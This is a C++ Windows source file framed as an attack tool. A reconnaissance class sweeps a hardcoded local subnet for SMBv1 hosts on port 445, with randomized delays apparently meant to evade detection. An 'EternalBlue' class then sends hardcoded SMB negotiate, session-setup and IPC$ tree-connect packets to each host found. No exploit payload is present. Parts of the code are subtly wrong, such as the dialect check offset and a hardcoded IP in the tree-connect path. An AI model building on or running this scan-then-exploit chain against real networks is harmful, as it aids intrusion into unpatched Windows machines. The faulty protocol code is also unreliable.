#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <atomic>
#include <algorithm>
#include <iomanip>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

// Helper to print byte buffer in hex
std::string bytes_to_hex(const unsigned char* data, size_t len) {
    std::stringstream ss;
    ss << std::hex;
    for (size_t i = 0; i < len; ++i) {
        ss << std::setw(2) << std::setfill('0') << (int)data[i] << " ";
        if ((i + 1) % 16 == 0) ss << "\n";
    }
    return ss.str();
}

class NetworkRecon {
private:
    struct NetConfig {
        std::string network;
        std::string mask;
        int prefix;
        std::string localIP;
    };

    static std::atomic<int> scanned_count;
    static std::atomic<int> target_count;

public:
    static std::vector<std::string> Execute() {
        NetConfig config = AcquireNetworkConfig();
        std::vector<std::string> vulnerableHosts;

        if (!config.network.empty()) {
            std::cout << "[+] Acquired network: " << config.network << "/" << config.prefix
                      << " (Local IP: " << config.localIP << ")" << std::endl;
            scanned_count = 0;
            target_count = 0;
            config.network = "192.168.84.0";
            config.prefix = 24;
            vulnerableHosts = PerformScan(config);
        } else {
            std::cout << "[-] No valid network adapter found." << std::endl;
        }

        return vulnerableHosts;
    }

private:
    static NetConfig AcquireNetworkConfig() {
        PIP_ADAPTER_ADDRESSES adapters = nullptr;
        ULONG buf_size = 0;
        NetConfig config = {};

        DWORD ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, nullptr, adapters, &buf_size);
        if (ret == ERROR_BUFFER_OVERFLOW) {
            adapters = (PIP_ADAPTER_ADDRESSES)malloc(buf_size);
            ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, nullptr, adapters, &buf_size);

            if (ret == ERROR_SUCCESS) {
                for (PIP_ADAPTER_ADDRESSES adapter = adapters; adapter; adapter = adapter->Next) {
                    if (ValidateAdapter(adapter)) {
                        config = ExtractConfig(adapter);
                        break;
                    }
                }
            }
            free(adapters);
        }
        return config;
    }

    static bool ValidateAdapter(PIP_ADAPTER_ADDRESSES adapter) {
        return (adapter->OperStatus == IfOperStatusUp &&
                adapter->FirstGatewayAddress != nullptr &&
                adapter->FirstUnicastAddress != nullptr &&
                adapter->IfType != IF_TYPE_SOFTWARE_LOOPBACK);
    }

    static NetConfig ExtractConfig(PIP_ADAPTER_ADDRESSES adapter) {
        NetConfig config;
        PIP_ADAPTER_UNICAST_ADDRESS unicast = adapter->FirstUnicastAddress;

        if (unicast && unicast->Address.lpSockaddr->sa_family == AF_INET) {
            sockaddr_in* ipv4 = (sockaddr_in*)unicast->Address.lpSockaddr;
            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
            config.localIP = ip_str;

            std::string mask = CalculateMask(unicast->OnLinkPrefixLength);
            config.network = CalculateNetwork(ip_str, mask);
            config.mask = mask;
            config.prefix = unicast->OnLinkPrefixLength;
        }
        return config;
    }

    static std::vector<std::string> PerformScan(const NetConfig& config) {
        std::vector<std::string> targets = GenerateTargets(config);
        std::vector<std::string> vulnerable;

        std::cout << "[+] Scanning " << targets.size() << " potential targets..." << std::endl;

        for (const auto& target : targets) {
            std::cout << "[*] Checking " << target << " ... ";
            if (CheckPort(target, 445)) {
                std::cout << "SMBv1 VULNERABLE" << std::endl;
                vulnerable.push_back(target);
                target_count++;
            } else {
                std::cout << "SAFE" << std::endl;
            }
            scanned_count++;
            ApplyDelay();
        }

        return vulnerable;
    }

    static std::vector<std::string> GenerateTargets(const NetConfig& config) {
        std::vector<std::string> targets;
        in_addr net_addr;
        inet_pton(AF_INET, config.network.c_str(), &net_addr);

        int total_hosts = (1 << (32 - config.prefix)) - 2;
        if (total_hosts <= 0) return targets;

        std::vector<int> host_nums;
        // for (int i = 1; i < total_hosts + 1; i++) { 
        //     host_nums.push_back(i);
        // }
        host_nums.push_back(135);

        std::random_device rd;
        std::mt19937 g(rd());
        std::shuffle(host_nums.begin(), host_nums.end(), g);

        for (int host_num : host_nums) {
            uint32_t host_ip = ntohl(net_addr.s_addr) + host_num;
            in_addr ip;
            ip.s_addr = htonl(host_ip);

            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &ip, ip_str, INET_ADDRSTRLEN);

            if (std::string(ip_str) != config.localIP) {
                targets.push_back(ip_str);
            }
        }
        return targets;
    }

    static bool CheckPort(const std::string& host, int port) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;

        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);

        sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &target.sin_addr);

        if (connect(sock, (sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
            if (WSAGetLastError() != WSAEWOULDBLOCK) {
                closesocket(sock);
                std::cout << "Connect failed with error: " << WSAGetLastError() << std::endl;
                return false;
            }
        }

        fd_set writefds;
        FD_ZERO(&writefds);
        FD_SET(sock, &writefds);

        timeval timeout{1, 0}; 
        int result = select(0, NULL, &writefds, NULL, &timeout);
        closesocket(sock);

        if (result > 0) {
            return VerifySMBv1Protocol(host);
        } else {
            std::cout << "Port check failed, select result: " << result << ", error: " << WSAGetLastError() << std::endl;
        }
        return false;
    }

    static bool VerifySMBv1Protocol(const std::string& host) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;

        int timeout_ms = 3000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));

        sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(445);
        inet_pton(AF_INET, host.c_str(), &server.sin_addr);

        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }

        // Tạo Negotiate packet chỉ có dialect cũ
        std::vector<uint8_t> packet;
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00}); // NetBIOS length

        packet.insert(packet.end(), {
            0xFF, 'S', 'M', 'B', 0x72,
            0x00, 0x00, 0x00, 0x00,
            0x18,
            0x03, 0xC8,
            0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
            0x00, 0x00,
            0xFF, 0xFE,
            0x00, 0x00,
            0x00, 0x00
        });

        packet.push_back(0x00); // Word count

        const char* dialects[] = {
            "PC NETWORK PROGRAM 1.0",
            "LANMAN1.0",
            "Windows for Workgroups 3.1a",
            "LM1.2X002",
            "LANMAN2.1"
        };

        std::vector<uint8_t> dialect_bytes;
        for (const char* d : dialects) {
            dialect_bytes.insert(dialect_bytes.end(), d, d + strlen(d));
            dialect_bytes.push_back(0x00);
        }

        uint16_t byte_count = dialect_bytes.size();
        packet.push_back(byte_count & 0xFF);
        packet.push_back((byte_count >> 8) & 0xFF);
        packet.insert(packet.end(), dialect_bytes.begin(), dialect_bytes.end());

        // Cập nhật NetBIOS length
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;

        if (send(sock, (char*)packet.data(), packet.size(), 0) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }

        unsigned char buffer[2048];
        int received = recv(sock, (char*)buffer, sizeof(buffer), 0);
        closesocket(sock);

        if (received <= 0) return false;

        std::cout << "Received " << received << " bytes" << std::endl;
        std::cout << "Response hex:\n" << bytes_to_hex(buffer, received) << std::endl;

        if (received < 10) return false;
        if (buffer[4] != 0xFF || buffer[5] != 'S' || buffer[6] != 'M' || buffer[7] != 'B' || buffer[8] != 0x72) {
            return false;
        }

        // ĐỌC DIALECT INDEX Ở OFFSET 9
        int dialect_index = buffer[9];
        std::cout << "Dialect index: " << dialect_index << std::endl;

        if (dialect_index <= 5) {
            std::cout << "SMBv1 DETECTED (Dialect: " << dialect_index << ")" << std::endl;
            return true;
        }

        return false;
    }

    static void ApplyDelay() {
        std::random_device rd;
        std::uniform_int_distribution<> d(20, 200);
        Sleep(d(rd));
        if (scanned_count % 30 == 0) {
            std::uniform_int_distribution<> ld(500, 1000);
            Sleep(ld(rd));
        }
    }

    static std::string CalculateMask(ULONG prefix) {
        if (prefix > 32) return "0.0.0.0";
        uint32_t mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF;
        in_addr addr;
        addr.s_addr = htonl(mask);
        char str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &addr, str, INET_ADDRSTRLEN);
        return str;
    }

    static std::string CalculateNetwork(const std::string& ip, const std::string& mask) {
        in_addr ip_addr, mask_addr, net_addr;
        inet_pton(AF_INET, ip.c_str(), &ip_addr);
        inet_pton(AF_INET, mask.c_str(), &mask_addr);
        net_addr.s_addr = ip_addr.s_addr & mask_addr.s_addr;
        char str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &net_addr, str, INET_ADDRSTRLEN);
        return str;
    }
};

class EternalBlue {
private:
    unsigned char smbNegotiate[137];
    unsigned char sessionSetup[140];
    unsigned char treeConnectRequest[100];

    unsigned char userID[2] = {0};
    unsigned char treeID[2];
    
    std::string targetIP;
    SOCKET sock = INVALID_SOCKET;

public:
    EternalBlue() {
        InitializePackets();
    }

    ~EternalBlue() {
        if (sock != INVALID_SOCKET) closesocket(sock);
    }

    bool StartExploit(const std::string& host) {
        targetIP = host;
        std::cout << "[*] Target: " << host << "\n\n";

        if (!Connect()) return false;
        if (!SendNegotiate()) return false;
        if (!DoSessionSetup()) return false;
        if (!SendTreeConnect()) return false;
        
        std::cout << "[+] Target appears vulnerable to EternalBlue!\n";
        return true;
    }

private:
    bool Connect() {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;

        int timeout = 5000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

        sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(445);
        inet_pton(AF_INET, targetIP.c_str(), &server.sin_addr);

        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock); sock = INVALID_SOCKET;
            return false;
        }

        return true;
    }

    bool Send(const unsigned char* data, size_t size) {
        int sent = send(sock, (char*)data, size, 0);
        if (sent != (int)size) {
            std::cout << "[-] Send failed: " << sent << "/" << size << "\n";
            return false;
        }
        return true;
    }

    int Recv(unsigned char* buffer, size_t size) {
        int received = recv(sock, (char*)buffer, size, 0);
        if (received <= 0) {
            std::cout << "[-] Recv failed: " << WSAGetLastError() << "\n";
        }
        return received;
    }

    void InitializePackets() {
        unsigned char negotiate[] = {
            0x00, 0x00, 0x00, 0x85, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xC0,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
            0x00, 0x00, 0x40, 0x00, 0x00, 0x62, 0x00, 0x02, 0x50, 0x43, 0x20, 0x4E, 0x45, 0x54, 0x57, 0x4F,
            0x52, 0x4B, 0x20, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02,
            0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x57, 0x69, 0x6E, 0x64, 0x6F,
            0x77, 0x73, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x57, 0x6F, 0x72, 0x6B, 0x67, 0x72, 0x6F, 0x75, 0x70,
            0x73, 0x20, 0x33, 0x2E, 0x31, 0x61, 0x00, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30,
            0x32, 0x00, 0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x32, 0x2E, 0x31, 0x00, 0x02, 0x4E, 0x54,
            0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00
        };
        memcpy(smbNegotiate, negotiate, sizeof(negotiate));

        unsigned char setup[] = {
            0x00, 0x00, 0x00, 0x88, 0xFF, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
            0x00, 0x00, 0x40, 0x00, 0x0D, 0xFF, 0x00, 0x88, 0x00, 0x04, 0x11, 0x0A, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x00, 0x00, 0x00, 0x4B,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00,
            0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00,
            0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00,
            0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00,
            0x30, 0x00, 0x20, 0x00, 0x35, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00
        };
        memcpy(sessionSetup, setup, sizeof(setup));

        unsigned char treeConnect[] = {
            0x00, 0x00, 0x00, 0x60, 0xFF, 0x53, 0x4D, 0x42, 0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
            0x00, 0x08, 0x40, 0x00, 0x04, 0xFF, 0x00, 0x60, 0x00, 0x08, 0x00, 0x01, 0x00, 0x35, 0x00, 0x00,
            0x5C, 0x00, 0x5C, 0x00, 0x31, 0x00, 0x39, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x36, 0x00,
            0x38, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x37, 0x00, 0x35, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x32, 0x00,
            0x38, 0x00, 0x5C, 0x00, 0x49, 0x00, 0x50, 0x00, 0x43, 0x00, 0x24, 0x00, 0x00, 0x00, 0x3F, 0x3F,
            0x3F, 0x3F, 0x3F, 0x00
        };
        memcpy(treeConnectRequest, treeConnect, sizeof(treeConnect));
    }

    bool SendNegotiate() {
        if (!Send(smbNegotiate, sizeof(smbNegotiate))) return false;

        unsigned char resp[1024];
        int len = Recv(resp, sizeof(resp));

        if (len < 36) return false;
        return true;
    }

    bool DoSessionSetup() {
        if (!Send(sessionSetup, sizeof(sessionSetup))) return false;

        unsigned char resp[1024];
        int len = Recv(resp, sizeof(resp));
        if (len < 36) {
            return false;
        }

        uint32_t status = *(uint32_t*)(resp + 9);
        if (status != 0) return false;

        userID[0] = resp[32];
        userID[1] = resp[33];
        
        return true;
    }

    bool SendTreeConnect() {
        treeConnectRequest[32] = userID[0];
        treeConnectRequest[33] = userID[1];

        // std::string targetPath = "\\\\" + targetIP + "\\IPC$";
        // size_t pathOffset = 56;
        
        // for (size_t i = 0; i < targetPath.length(); i++) {
        //     treeConnectRequest[pathOffset + (i * 2)] = targetPath[i];
        //     treeConnectRequest[pathOffset + (i * 2) + 1] = 0x00;
        // }

        if (!Send(treeConnectRequest, sizeof(treeConnectRequest))) {
            return false;
        }

        unsigned char resp[1024];
        int len = Recv(resp, sizeof(resp));

        if (len < 36) return false;

        treeID[0] = resp[28];
        treeID[1] = resp[29];

        uint32_t status = *(uint32_t*)(resp + 9);
        if (status != 0) return false;

        return true;
    }
};

class Attack {
public:
    static void Launch() {
        auto targets = NetworkRecon::Execute();
        EternalBlue exploit;
        for (const auto& t : targets) {
            exploit.StartExploit(t);
        }
    }
};

// === Static init ===
std::atomic<int> NetworkRecon::scanned_count(0);
std::atomic<int> NetworkRecon::target_count(0);

int main() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cout << "[-] WSAStartup failed\n";
        return 1;
    }

    Attack::Launch();

    WSACleanup();
    return 0;
}